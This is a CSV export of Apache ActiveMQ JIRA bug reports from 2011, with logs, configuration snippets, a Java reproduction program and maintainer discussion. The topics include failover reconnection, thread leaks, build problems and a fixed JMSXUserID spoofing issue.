note the advisoryForFastProducers gives a notification every time.
Also the jmx support for detecting flow control is improved by AMQ-6614;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
SNAPSHOT 5.5 will not start,AMQ-3230,12501859,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,aletheia7,aletheia7,19/Mar/11 08:23,13/Apr/13 06:10,14/Jul/23 05:43,21/Mar/11 13:34,5.5.0,,,,,,,,Broker,,,,0,,,,,,,,,"1) Downloaded apache-activemq-5.5-SNAPSHOT-bin-2011-03-19-04-34-52.zip.
2) Ran bin\win32\InstallService.bat
3) Started the Service and it could not be started. I did not change conf files.

Attached it the wrapper.log which shows the error.

The last good version I downloaded was 3/12/2011 at 2:01am from the 5.5 SNAPSHOT directory.","Windows Server 2003
java version ""1.6.0_22""
Java(TM) SE Runtime Environment (build 1.6.0_22-b04)
Java HotSpot(TM) Client VM (build 17.1-b03, mixed mode, sharing)",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"19/Mar/11 08:26;aletheia7;wrapper.log;https://issues.apache.org/jira/secure/attachment/12474062/wrapper.log",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74714,,,Mon Mar 21 13:34:12 UTC 2011,,,,,,,,,,,"0|i0ebxr:",81696,,,,,,,,,,,,,,,,,,,,,"19/Mar/11 08:26;aletheia7;Strings out of bounds error. The activemq.log and audit.log files where present, yet zero bytes.;;;","21/Mar/11 13:34;dejanb;This should be fixed with svn revision 1083770 and available in the next snapshot;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
SNAPSHOT 5.5 is not being built,AMQ-3223,12501646,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,aletheia7,aletheia7,17/Mar/11 03:12,13/Apr/13 06:10,14/Jul/23 05:43,17/Mar/11 16:07,5.5.0,,,,,,,,Broker,,,,0,,,,,,,,,"The 5.5 build has stopped. The MD5 and SHA1 hash files are created daily however the timestamps of the build file are not updated for apache-activemq-5.5-SNAPSHOT-bin.zip. Attached to this issue is a screen shot.

I am not familiar with maven. What would be the mvn command string to issue to build the package?

Location: https://repository.apache.org/content/repositories/snapshots/org/apache/activemq/apache-activemq/5.5-SNAPSHOT/",,aletheia7,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/Mar/11 03:19;aletheia7;ASF.LICENSE.NOT.GRANTED--screenshot-1.jpg;https://issues.apache.org/jira/secure/attachment/12473876/ASF.LICENSE.NOT.GRANTED--screenshot-1.jpg",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74716,,,Sat Apr 13 06:10:34 UTC 2013,,,,,,,,,,,"0|i0ebxj:",81695,,,,,,,,,,,,,,,,,,,,,"17/Mar/11 03:19;aletheia7;Notice the difference between 

apache-activemq-5.5-SNAPSHOT-bin.zip 	Sat Mar 12 03:59:26 UTC 2011 	60431205
and
apache-activemq-5.5-SNAPSHOT-bin.zip.md5 	Wed Mar 16 06:16:55 UTC 2011 32;;;","17/Mar/11 16:07;dejanb;It's fixed now. Thanks for reporting.;;;","13/Apr/13 06:10;aletheia7;Fixed;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Failover and SimpleDiscovery - query parameters getting dropped,AMQ-3222,12501600,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,16/Mar/11 16:56,24/Apr/15 14:57,14/Jul/23 05:43,21/Mar/11 10:30,5.4.2,,,,,5.5.0,,,Broker,Transport,,,0,failover,networkBridge,networkConnector,,,,,,"Using failover with static discovery makes sense in a master slave scenario. 
With simple static discovery with a pair of uri's, {code}<networkConnector uri=""static:(tcp://localhost:32258,tcp://localhost:32259)"" />{code} static discovery will continue to try and connect to both uris which leads to repeated logging of failed attempts to bridge to the slave that is not active yet.
Using failover{code}<networkConnector uri=""static:(failover:(tcp://localhost:32258,tcp://localhost:32259)?randomize=false&amp;maxReconnectAttempts=1)""/>{code} improves on this as the failover: transport will be content with just one uri, from the broker perspective there is a single network bridge, rather than two.
Currently query parameter are not correctly applied.
Query parameter parsing is problematic when options for a transport are duplicated by the discovery mechanism, e.g: maxReconnectAttempts. There have been some related efforts to resolve this, https://issues.apache.org/jira/browse/AMQ-2981 and https://issues.apache.org/jira/browse/AMQ-2598. Parameters are stripped from transport uris and applied to both the transport and the discovery mechanism. 
The end result, and fix, is that additional transport options that need to be applied to discovered transport (which typically have all query parameters removed) need to be isolated from normal query parameters using a dot (prefixed with ""discovered."") notation. e.g: {code}discovery:(multicast://default)?initialReconnectDelay=100&discovered.closeAsync=false""{code} ",,gtully,tbain98,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3707,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14674,,,Fri Apr 24 14:57:06 UTC 2015,,,,,,,,,,,"0|i0ajpb:",59465,,,,,,,,,,,,,,,,,,,,,"21/Mar/11 10:30;gtully;http://svn.apache.org/viewvc?rev=1082333&view=rev

For non static discovery of networks or client connections, parameters that need to be applied to all discovered uris should be specified on the discovery uri using the prefix ""discovered."".
Static discovery just adds the parameters in the normal way.;;;","24/Sep/14 19:45;tbain98;Gary, contrary to your comment on 21/Mar/11, I found that I could only set socketBufferSize for the underlying transports in a static: discovery URI when prefixing with ""discovered."", just as you say I would need to do for a failover: discovery URI.

My working URI, for ActiveMQ 5.8.0:
static:(tcp://hostname:port)?discovered.socketBufferSize=2498560

Can you please clarify your comment to explain how query parameters should be applied to the static discovery transport and/or to the underlying discovered transports within those static discovery transports?;;;","24/Apr/15 14:57;gtully;I would expect{code}static:(tcp://hostname:port?socketBufferSize=2498560){code} to work also. The discovered. option to static will work too, but in the static case there is only one url to augment.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Wildcards do not work with included destinations for network connectors.,AMQ-3220,12501470,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,15/Mar/11 15:07,15/Mar/11 15:10,14/Jul/23 05:43,15/Mar/11 15:10,5.4.2,,,,,5.5.0,,,,,,,0,,,,,,,,,"I think this is related to old issue (https://issues.apache.org/jira/browse/AMQ-1629) and that there's a general issue with filter matching while determining if destination is permissible

",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14664,,,Tue Mar 15 15:10:23 UTC 2011,,,,,,,,,,,"0|i0ajpj:",59466,,,,,,,,,,,,,,,,,,,,,"15/Mar/11 15:10;dejanb;fixed with svn revision 1081810;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"""InactivityMonitor Async Task"" threads leaking",AMQ-3214,12500963,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,,timiblossom,timiblossom,09/Mar/11 23:52,20/Sep/11 10:42,14/Jul/23 05:43,29/Jun/11 23:42,,,,,,5.6.0,,,JMS client,Transport,,,0,,,,,,,,,"-Have a multi-thread consumers running to consumer messages
-Have Connection to have these :
       		ActiveMQConnectionFactory connectionFactory = new ActiveMQConnectionFactory(brokerUrl);
		connectionFactory.setUseAsyncSend(false);
		connectionFactory.setDispatchAsync(false);
		connectionFactory.setAlwaysSessionAsync(false);
		connectionFactory.setAlwaysSyncSend(true);

-Run the consumers for several hours and profile it
-You will see there are threads with the name ""InactivityMonitor Async Task"" being spawning continuously

This will cause the entire consumer system to slow down eventually due to thread context switching.  

Suggestion to fix: we should not put a limit on the number of ""InactivityMonitor Async Task"" threads to be Max Integer.  There is a bug in Java lib that
it will not stop a thread after a given idle time-to-live. We could fix this in the file InactivityMonitor.java
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,3600,3600,,0%,3600,3600,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"19/May/11 21:41;timiblossom;threadleak.png;https://issues.apache.org/jira/secure/attachment/12479844/threadleak.png",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14590,,,Wed Jun 29 23:42:20 UTC 2011,,,,,,,,,,,"0|i0ajq7:",59469,,,,,,,,,,,,,,,,,,,,,"28/Mar/11 12:04;gtully;do you have a reference to the JDK bug that will not timeout idle threads?;;;","19/May/11 21:40;timiblossom;Hi Gary,

I used java version ""1.6.0_20"".  However, I do think this issue is on ThreadPoolExecutor so it will happen on all 1.6.x.
The problem is that if we construct a ThreadPoolExecutor like the way the InactivityMonitor.java does, all threads will become core threads and they will not get discarded as they become idle unless we set  ThreadPoolExecutor.allowCoreThreadTimeOut to be true (it is false be default).

I think both ActiveMQ client and server are using the InactivityMonitor class and both will be slow down to a complete stop after a while.

I had a patch on this in our development and I could see the problem is gone.  What I did was the change the way InactivityMonitory construct the asynch task threadpool.


;;;","19/May/11 21:41;timiblossom;This image is on the ActiveMQ client library after I ran using it stress test the ActiveMQ server;;;","19/May/11 22:11;tabish;I tried to replicate this sort of behaviour from AMQ but can't using JDK 1.6.0_21 also couldn't find any open bugs for the JDK that sound like this.  Perhaps you should try an JDK update and if that fails to help maybe provide a stress test example that demonstrates the problem.  

The way the executor is created now should prevent any threads from being treated as Core threads so they should timeout according to the set idle time.;;;","20/May/11 22:02;timiblossom;Hi Timothy,

We actually had this issue in a few different enviroments here running ActiveMQ server or ActiveMQ client.  

In my previous company, they opted out to purchase SonicMQ after deploying ActiveMQ server to production and having to restart ActiveMQ almost every week with a noticeable slow-down day after day.  

I would not say that it is JDK's bug.  The way ThreadPoolExecutor being used in that InactivityMonitor is the problem.
I can repeat this every time.  Otherwise, could you please explain why there are so many InactivityMonitor  threads in my attached image?  I was using YourKit to do the profiling.;;;","29/Jun/11 23:42;tabish;Added the call to allowCoreThreadTimeOut(true) since it shouldn't affect the code regardless.  ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
failover doesn't reconnect after broker restart,AMQ-3213,12500904,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,shcheklein,shcheklein,09/Mar/11 16:10,03/Oct/19 05:24,14/Jul/23 05:43,14/Oct/11 14:34,5.4.2,,,,,5.6.0,,,Broker,,,,2,,,,,,,,,"I have a network of three brokers: two embedded (publisher and subscriber) and one stand alone remote. Embedded brokers connect to the remote with duplex static failover connections. Everything works fine if remote broker is not restarted. After the remote broker is restarted embedded brokers fail to reestablish duplex bridges. Subscriber doesn't receive any messages and in logs I have:

*Subscriber worker:*

{code}
Received 14-th message.
Received 15-th message.
Received 16-th message.
2011:03:09 18:19:08,276 [WARN ] org.apache.activemq.transport.failover.FailoverTransport - Transport (localhost/127.0.0.1:61616) failed to tcp://localhost:61616 , attempting to automatically reconnect due to: java.net.SocketException: Connection reset
2011:03:09 18:19:08,276 [INFO ] org.apache.activemq.network.DemandForwardingBridgeSupport - Outbound transport to remote interrupted.
2011:03:09 18:19:22,426 [INFO ] org.apache.activemq.network.DemandForwardingBridgeSupport - Network connection between vm://local1#0 and tcp://localhost:61616(remote) has been established.
2011:03:09 18:19:22,429 [INFO ] org.apache.activemq.network.DemandForwardingBridgeSupport - Outbound transport to remote resumed
2011:03:09 18:19:22,429 [INFO ] org.apache.activemq.transport.failover.FailoverTransport - Successfully reconnected to tcp://localhost:61616
2011:03:09 18:19:22,455 [WARN ] org.apache.activemq.broker.TransportConnection - Unexpected extra broker info command received: BrokerInfo {commandId = 1929, responseRequired = false, brokerId = ID:Air-17262-1299683959982-0:1, brokerURL = tcp://validation.sls.microsoft.com:61616, slaveBroker = false, masterBroker = false, faultTolerantConfiguration = false, networkConnection = false, duplexConnection = false, peerBrokerInfos = [], brokerName = remote, connectionId = 0, brokerUploadUrl = null, networkProperties = null}
{code}


*Publisher worker:*

{code}
Sending 28-th message
Sending 29-th message
Sending 30-th message
2011:03:09 18:19:22,430 [INFO ] org.apache.activemq.network.DemandForwardingBridgeSupport - Network connection between vm://local#0 and tcp://localhost:61616(remote) has been established.
2011:03:09 18:19:22,435 [INFO ] org.apache.activemq.network.DemandForwardingBridgeSupport - Outbound transport to remote resumed
2011:03:09 18:19:22,435 [INFO ] org.apache.activemq.transport.failover.FailoverTransport - Successfully reconnected to tcp://localhost:61616
2011:03:09 18:19:22,469 [WARN ] org.apache.activemq.broker.TransportConnection - Unexpected extra broker info command received: BrokerInfo {commandId = 1911, responseRequired = false, brokerId = ID:Air-17262-1299683959982-0:1, brokerURL = tcp://validation.sls.microsoft.com:61616, slaveBroker = false, masterBroker = false, faultTolerantConfiguration = false, networkConnection = false, duplexConnection = false, peerBrokerInfos = [], brokerName = remote, connectionId = 0, brokerUploadUrl = null, networkProperties = null}
Sending 31-th message
Sending 32-th message
Sending 33-th message
{code}

*Sample code to reproduce this issue:*

{code}
import org.apache.activemq.ActiveMQConnectionFactory;
import org.apache.activemq.broker.BrokerService;
import org.apache.activemq.broker.TransportConnector;
import org.apache.activemq.network.NetworkConnector;

import javax.jms.*;
import java.net.URI;


public class JmsTester implements MessageListener {

    private static final int size = 256;
    private static byte[] payload;

    static {
        char[] DATA = ""abcdefghijklmnopqrstuvwxyz"".toCharArray();
        payload = new byte[size];
        for (int i = 0; i < size; i++) {
            payload[i] = (byte)DATA[i % DATA.length];
        }
    }

    public static void main(String[] args) throws Exception {
        if(System.getProperty(""jms.mode"").equals(""publisher""))
            publisher();
        else if(System.getProperty(""jms.mode"").equals(""broker""))    
            broker();
        else
            subscriber();
    }

    private static void publisher() throws Exception {
        System.out.println(""Starting publisher ..."");
        BrokerService broker = new BrokerService();
        broker.setBrokerName(""local"");
        broker.setUseJmx(true);
        broker.setPersistent(true);
        NetworkConnector nc = broker.addNetworkConnector(""static:(failover:(tcp://localhost:61616))"");
        nc.setDuplex(true);
        nc.setNetworkTTL(4);
        broker.start();

        ActiveMQConnectionFactory factory = new ActiveMQConnectionFactory(""vm://local"");
        Connection connection = factory.createConnection();
        Session session = connection.createSession(false, Session.DUPS_OK_ACKNOWLEDGE);
        Topic topic = session.createTopic(""topictest.messages"");

        MessageProducer publisher = session.createProducer(topic);
        publisher.setDeliveryMode(DeliveryMode.PERSISTENT);

        for (int i=0; i<1000; i++) {
            Thread.sleep(1000);
            System.out.println(""Sending "" + i + ""-th message"");
            BytesMessage msg = session.createBytesMessage();
            msg.setIntProperty(""count"", i);
            msg.writeBytes(payload);
            publisher.send(msg);
        }

        broker.stop();
    }

    private static void broker() throws Exception {
        System.out.println(""Starting broker ..."");
        BrokerService broker = new BrokerService();
        broker.setPersistent(true);
        broker.setBrokerName(""remote"");
        broker.setUseJmx(true);
        TransportConnector connector = new TransportConnector();
        connector.setUri(new URI(""tcp://localhost:61616""));
        
        broker.addConnector(connector);
        broker.start();
        while(true) { }
    }

    private static void subscriber() throws Exception {
        System.out.println(""Starting subscriber ..."");

        BrokerService broker = new BrokerService();
        broker.setBrokerName(""local1"");
        broker.setUseJmx(true);
        broker.setPersistent(true);
        NetworkConnector nc = broker.addNetworkConnector(""static:(failover:(tcp://localhost:61616))"");
        nc.setDuplex(true);
        nc.setNetworkTTL(4);
        broker.start();

        ActiveMQConnectionFactory factory = new ActiveMQConnectionFactory(""vm://local1"");
        Connection connection = factory.createConnection();
        connection.setClientID(""subscriber2"");
        Session session = connection.createSession(false, Session.DUPS_OK_ACKNOWLEDGE);

        Topic topic = session.createTopic(""topictest.messages"");

        MessageConsumer consumer = session.createDurableSubscriber(topic, ""subscriber2"");
        JmsTester tester = new JmsTester();
        consumer.setMessageListener(tester);
        connection.start();
        while(true) {
            Thread.sleep(1000);
        }
    }

    @Override
    public void onMessage(Message message) {
        try {
            int count = message.getIntProperty(""count"");
            System.out.println(""Received "" + count + ""-th message."");
        } catch (JMSException e) {
            e.printStackTrace();
        }
    }
}
{code}","Windows 7 x64, jdk 1.6.0_21",acalvo,ciand7,sibmaks,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,65687,,,Thu Oct 03 05:03:41 UTC 2019,,,,,,,,,,,"0|i0ajqf:",59470,,,,,,,,,,,,,,,,,,,,,"10/Mar/11 17:48;gtully;There were some fixes in this area w.r.t to duplicate network connection detection. One of the prerequisites is that the brokerId be specified for the broker to ensure it is maintained after a restart. The broker id and networkConnector name(if there is more than one duplex network connector configured (for 5.5) are use to identify duplicate network connectors and pull down old sate that can be pending with a temp network partition or fast restart.
Can you validate a 5.5-SNAPSHOT? But first, try setting a brokerId, use the same value as your brokerName. ;;;","10/Mar/11 21:12;shcheklein;Gary, thanks for response. Unfortunatelly, I have the same result with brokerId and with 5.5-SNAPSHOT either. BTW, it's pretty strange but 5.5-SNAPSHOT doesn't work without slf4j-log4j12-1.5.11, slf4j-api-1.5.11. Are they both required now? 5.4.2 works fine without them.;;;","25/Jul/11 17:22;acalvo;Tried with 5.5.0 final in our test lab and we're having the same behavior.

Is there any fix?;;;","09/Aug/11 05:23;artnaseef;Did you try adding broker.setBrokerId(...unique_id_per_broker...)?  How about nc.setName(...unique_nc_id...)?

For example
{code}
    private static void publisher() throws Exception {
        System.out.println(""Starting publisher ..."");
        BrokerService broker = new BrokerService();
        broker.setBrokerName(""local"");

        broker.setBrokerId(""publisherEmbeddedBrokerId"");

        broker.setUseJmx(true);
        broker.setPersistent(true);
        NetworkConnector nc = broker.addNetworkConnector(""static:(failover:(tcp://localhost:61616))"");
        nc.setDuplex(true);
        nc.setNetworkTTL(4);

        nc.setName(""publisherConnToNw"");
{code};;;","09/Aug/11 09:26;gtully;@Andreas - use static:(failover:(tcp://localhost:61616)?maxReconnectAttempts=1) or no failover at all in the network connector.
A networkConnector does its own reconnection/recreation in the event of a failure. The failover transport hides the failure and does not properly reconstitute the duplex state. failover: with a network connector is really only beneficial to make a choice between two urls.;;;","09/Aug/11 11:06;shcheklein;@Arthur Yes, I tried both - didn't work, as far as I remember.

@Gary @Andreas I've tried without failover. It works so far. Though I think it's not obvious that failover can not be used in the network connector. This still can be considered as a buggy behavior I suppose.;;;","14/Oct/11 14:34;tabish;This should be resolved by the changes in AMQ-3542;;;","03/Oct/19 05:03;sibmaks;[~tabish] , [~gtully], hello, we got the same issue, but we use 5.15.10 version.

I use Nginx for emulating shutting down of ActiveMQ:
{code:json}
worker_processes 1;

events {
	worker_connections 1024;
}

stream {
	upstream dev {
		server remote_url.com:61616;
	}
	upstream stub {
		server localhost:61616;
	}

	server {
		listen 1199;
		proxy_pass dev;
	}
}
{code}
After shutting down I wait until this logs:
{code:java}
(serverId=34) 2019-10-03 11:01:54.359  WARN ActiveMQ Task-3 FailoverTransport:doReconnect:1100 - Failed to connect to [tcp://localhost:1199] after: 10 attempt(s) continuing to retry.
{code}
And then I start Nginx again. If I use failover then messages not sending on the remote broker. Otherwise, there are sending (new and old);;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
JMSXUserId Can be spoofed by client,AMQ-3211,12500835,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,michsteiner,michsteiner,09/Mar/11 03:28,15/Mar/11 11:53,14/Jul/23 05:43,10/Mar/11 13:27,5.4.2,,,,,5.5.0,,,Broker,,,,0,,,,,,,,,"It seems the JMSXUserId can be spoofed by client contrary to what http://activemq.apache.org/jmsxuserid.html says.

My test setup is populateJMSXUserID=""true set in a single broker, a JAAS config org.apache.activemq.jaas.TextFileCertificateLoginModule and using mutual auth SSL (i.e., ?needClientAuth=true for transportConnector setup), and a single consumer and producer based on small modifications of the ConsumerTool and ProducerTool examples in the 5.4.2 distro.  See attached the changes to the distro package to demonstrate the bug. Just do
1. run apache-activemq-5.4.2/bin/activemq-admin start
2. in apache-activemq-5.4.2/example run ant consumer -Durl=ssl://localhost:61617 -Dmax=3 -Dverbose=true
3. in another shell in apache-activemq-5.4.2/example run ant producer -Durl=ssl://localhost:61617 -Dmax=3 -Dverbose=true
4. look at the output of the consumer for the properties printed after each received message (the producer spoofs only on even numbered messages)

When the client does not set the property, then i get the properly authenticated DN as JMSXUserID using message.getStringProperty(""JMSXUserID""). However, when the client sets it, i get the value set by the client.  The only difference i notice is that in the former case, message.getPropertyNames() does not return JMSXUserID whereas in the spoofed case it does. 

i wonder whether in the context of https://issues.apache.org/jira/browse/QPID-943 or https://issues.apache.org/jira/browse/AMQ-2840 (which interestingly doesn't list JMSXUserID as supported in a comment even though it is?) something got messed up?",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3183,,,,,,"09/Mar/11 15:30;michsteiner;JMSXUserID-bug.conf-src.tar.bz2;https://issues.apache.org/jira/secure/attachment/12473150/JMSXUserID-bug.conf-src.tar.bz2","09/Mar/11 15:31;michsteiner;JMSXUserID-bug.diff;https://issues.apache.org/jira/secure/attachment/12473151/JMSXUserID-bug.diff",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14666,,,Tue Mar 15 11:53:25 UTC 2011,,,,,,,,,,,"0|i0ajqn:",59471,,,,,,,,,,,,,,,,,,,,,"09/Mar/11 15:30;michsteiner;The files from apache-activemq-5.4.2/conf and apache-activemq-5.4.2/examples which include all changes i've done to demonstrate problem (see for comments with MSTEINER in it ...);;;","09/Mar/11 15:31;michsteiner;The diff from the standard apache-activemq-5.4.2 distribution which demonstrates the bug;;;","10/Mar/11 12:49;gtully;This seems broken to me. ActiveMQ does allow setting the JMSXUserId property but it should only be used in the absence of any other setting of user credentials.
Currently, the call to get JMSXUserId looks first at the existing properties and then at the internal userId attribute. That logic should be reversed.

Typically, users should not set the JMSXUserId value, but if they do, it should be ignored if there is an alternative policy in place, ie: when BrokerService.populateJMSXUserID is specified and either the user id is set on the ActiveMQConnectionFactory or found through Authentication.;;;","10/Mar/11 13:27;gtully;resolved in http://svn.apache.org/viewvc?rev=1080212&view=rev
Can you validate the next 5.5-SNAPSHOT to ensure the fix captures your use case.
A client supplied JMSXUserID value is only used as a last resort. I think it is better from an interop and backward compatibility perspective to not explicitly disallow setting this property.;;;","10/Mar/11 23:03;michsteiner;> Can you validate the next 5.5-SNAPSHOT to ensure the fix captures your use case.

Thanks for the quick turn-around!!

I did not find a new built SNAPSHOT version but i saw changes in the
source and so built the version from svn.  While a few tests failed, 
(e.g., org.apache.activemq.network.DuplexNetworkMBeanTest and
org.apache.activemq.bugs.AMQ2021Test), i could successfully run my
tests and confirm that with the change JMSXUserID could not be spoofed
anymore (at least not the way i did in the past ;-). 

> A client supplied JMSXUserID value is only used as a last resort. I
> think it is better from an interop and backward compatibility
> perspective to not explicitly disallow setting this property. 

I'm not sure whether there is really a good use case for having clients
providing it, at least my security mindset would make opt for erring
on the safe side.  However, some of the the scenarios mentioned in
https://issues.apache.org/jira/browse/QPID-943 might need that
(although the original request still required validation at the broker
side which would be fail-safe).  However, I see at least two potentially
problematic cases:

- whether application code would see correct or potentially spoofed
  fields would depend on a config.

- what happens if the config must allow unauthenticated clients? 

The former is maybe more a stylic/robustness issue, i.e., multiple
lines of defense.   The latter though is a clear security issue. And
after a quick test with non-x509 based JAAS config  and

    org.apache.activemq.jaas.GuestLoginModule sufficient
       debug=true
       org.apache.activemq.jaas.guest.user=""guest""
       org.apache.activemq.jaas.guest.group=""guests"";

it seems anonymous guest result in no JMXSUserID (ie.d., above
guest.user/group seem to be ignored as far as JMSXUserID is
concerned) and i can still spoof ids.

So ideally, not allowing clients from setting it at all would be
best. Alternatives, i see (in decreasing orders of desirability )

(a) provide an option which allows passing through only validated
    JMSXUserID  (or to be on the fail-safe side, an option which 
    would have to be explicitly provided to allow a pass-through)

(b) Garantuee that an anonymous user has always a well-identified
    broker-provided JMSXUserID value

(c)  provide a way for the code to check where the value come from.

(Arguably, all together might even be better :-)

Regarding (c), there is actually a way by which it can be safely
determined that the field is not spoofed: if
message.getPropertyNames() does not include JMSXUserID but
.getStringProperty(""JMSXUserID"") is returned, it will not have been
set by JMS client code. Not sure, though, whether one couldn't modify
the JMS client library to change that behaviour and it might also
provide false alerts if the client has set the value but the broker
has overridden/corrected it.
;;;","11/Mar/11 10:51;gtully;there is an additional broker attribute: useAuthenticatedPrincipalForJMSXUserID which will ensure that the authenticated principal is placed in the JMSXUserId, such that it is explicitly set or overridden in the authenticated case. 
;;;","14/Mar/11 17:44;michsteiner;Thanks! Indeed, that field forces now the guest ids of JAAS into JMSXUserID. Incidentally, it also makes JMSXUserID now return mapped identities rather than X509 DNs for the SSL case.   

BTW: Given the spoofing potential without that option (and the bug in <5.5), i tried to update  http://activemq.apache.org/jmsxuserid.html correspondingly. But i guess just signing up to confluence is not enough to update these pages?;;;","14/Mar/11 18:00;gtully;yeah, confluence is restricted to committers,
can you add (via comment or diff/patch) any doco updates to this jira and I will update confluence. ;;;","14/Mar/11 18:51;michsteiner;i kindof assumed that i wouldn't be allowed to change but as i saw an edit button and could sign up, i thought i should give it try instead of offloading everything to you :-)

Anyway, what i would have added is along the lines of below: the disclaimer of the second paragraph certainly needs some editing regarding version references -- not sure how you handle that -- but i thought it would be good to document the vulnerability. Arguably, one could also mention the  getPropertyNames() test i outlined above as temporary workaround for older versions but i'm not 100% sure whether it secure, so i omitted that.

``If you allow anonymous access, you MUST also add the _useAuthenticatedPrincipalForJMSXUserID_  property of the broker element and set it to true. Otherwise,  anonymous clients can spoof identities. Note, though, that for SSL certificate based authentication, e.g., when using TextFileCertificateLoginModule JAAS module, this will change the semantics of the broker-provided JMSXUserID. Instead of returning the DN of the certificate, it will provide the name the DN is mapped to by the JAAS module.

Also note that versions up to (and including) 5.4.2 are vulnerable to spoofing. A fix is included in 5.5-SNAPSHOT > March 12th, 2011.'';;;","15/Mar/11 11:53;gtully;updated the doco, https://cwiki.apache.org/confluence/display/ACTIVEMQ/JMSXUserID

thanks for the feedback :-);;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
